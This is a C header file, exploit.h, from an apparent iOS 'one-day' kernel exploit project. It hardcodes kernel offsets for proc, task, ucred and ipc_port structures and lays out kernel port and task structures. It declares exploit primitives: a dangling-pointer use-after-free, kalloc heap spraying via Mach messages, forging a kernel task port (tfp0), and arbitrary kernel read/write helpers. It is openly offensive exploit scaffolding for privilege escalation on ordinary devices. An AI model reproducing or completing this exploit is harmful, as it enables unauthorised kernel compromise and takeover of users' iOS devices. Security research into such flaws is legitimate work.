//
//  exploit.h
//  1_day_iOS
//
//  Created by System on 01/12/2020.
//  Copyright Â© 2020 System. All rights reserved.
//

#ifndef exploit_h
#define exploit_h

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <mach/message.h>
#include <mach/vm_types.h>
#include <mach/mach.h>
#endif /* exploit_h */


#define offset_fileproc_fileglob 8
#define offset_fileglob_fgdata 0x38
#define offset_fileglob_fgops 0x28
#define offset_pipe_pipebuffer 0x10
#define offset_ipcport_ipreceiver 96
#define offset_fops_fotype 0
#define offset_fops_fdata 56
#define DTYPE_SOCKET 2
#define offset_kernelbase_socketops 0x487648
#define offset_kernelbase_kernproc  0x1a1bb00 
#define offset_kernproc_task 0x10
#define offset_proc_next 0
#define offset_proc_pid  0x60
#define offset_task_map 0x20
#define offset_task_bsd_info  0x358 // original 0x358
#define offset_task_itk_registered 744
#define offset_proc_ucred 0xf8

#define offset_proc_fd 0x100
#define offset_fd_ofiles 0
#define offset_fd_nfiles 0x48

#define offset_task_lck_mtx_type 0xb
#define offset_task_ref_count 0x10
#define offset_task_active 0x14
#define offset_task_map 0x20
#define offset_ipc_port_ip_bits 0
#define offset_ipc_port_ip_references 4
#define offset_ipc_port_ip_receiver 96
#define offset_ipc_port_ip_kobject 104
#define offset_ipc_port_ip_mscount 156
#define offset_ipc_port_ip_srights 160

#define offst_task_prev 0x30
typedef struct{
    int pipe_fd[2];
    uint8_t * buffer;
    uint64_t buffer_ptr_kaddr;
    uint64_t buffer_kaddr;
    int should_read ;
}my_pipe;

int make_tfp0(uint64_t ,uint64_t );

int make_pipe(uint64_t, my_pipe *);
int check_write(my_pipe *);
int GetPipebufferAddr(uint64_t ,my_pipe *);

int pipe_write(my_pipe *);
int pipe_read(my_pipe *);
int build_kernel_task_port(my_pipe *,uint64_t);

int get_ipc_space(uint64_t * );
int get_kernel_map(uint64_t *,uint64_t);
int make_dangling_pointer(void);

int Free_pipe(uint64_t  addr);

void get_ucred_addr(void);

typedef struct
{
    struct {
        uint64_t data;
        uint32_t reserved : 24,
        type     :  8;
        uint32_t pad;
    } lock;
    uint32_t ref_count;
    uint32_t active;
    uint32_t halting;
    uint32_t pad;
    uint64_t map;
} ktask_t;



int proc_pipes(uint64_t **ourpipes , int * pipecnt);
mach_port_t new_port(void);
mach_port_t send_kalloc_message(uint8_t *replacer_message_body, uint32_t replacer_body_size);

struct simple_msg {
    mach_msg_header_t hdr;
    char buf[0];
};
typedef volatile struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        uint64_t data;
        uint64_t type;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    uint64_t next;
                    uint64_t prev;
                } waitq_queue;
            } waitq;
            uint64_t messages; //64
            uint32_t seqno;  //72
            uint32_t receiver_name;  // 76
            uint16_t msgcount; //80
            uint16_t qlimit; //82
            uint32_t pad;  //84
        } port;
        uint64_t klist;  //88
    } ip_messages;
    uint64_t ip_receiver; //96
    uint64_t ip_kobject;
    uint64_t ip_nsrequest;
    uint64_t ip_pdrequest;
    uint64_t ip_requests;
    uint64_t ip_premsg;
    uint64_t ip_context;
    uint32_t ip_flags;
    uint32_t ip_mscount;
    uint32_t ip_srights;
    uint32_t ip_sorights;
} kport_t;

uint32_t mach_port_waitq_flags(void);

#define _EVENT_MASK_BITS        ((sizeof(uint32_t) * 8) - 7)

union waitq_flags {
    struct {
        uint32_t /* flags */
    waitq_type:2,    /* only public field */
    waitq_fifo:1,    /* fifo wakeup policy? */
    waitq_prepost:1, /* waitq supports prepost? */
    waitq_irq:1,     /* waitq requires interrupts disabled */
    waitq_isvalid:1, /* waitq structure is valid */
    waitq_turnstile_or_port:1, /* waitq is embedded in a turnstile (if irq safe), or port (if not irq safe) */
    waitq_eventmask:_EVENT_MASK_BITS;
    };
    uint32_t flags;
};
kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address, mach_vm_size_t size, int flags);
kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address, mach_vm_size_t size);
kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address, vm_offset_t data, mach_msg_type_number_t dataCnt);
kern_return_t mach_vm_read(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, vm_offset_t *data, mach_msg_type_number_t *dataCnt);


uint64_t kalloc(vm_size_t size);
void kfree(mach_vm_address_t address, vm_size_t size);
size_t kwrite(uint64_t where, const void *p, size_t size) ;
size_t kread(uint64_t where, void *p, size_t size);

void wk64(uint64_t where, uint64_t what);

void wk32(uint64_t where, uint32_t what) ;
uint32_t rk32(uint64_t where) ;

uint64_t rk64(uint64_t where) ;
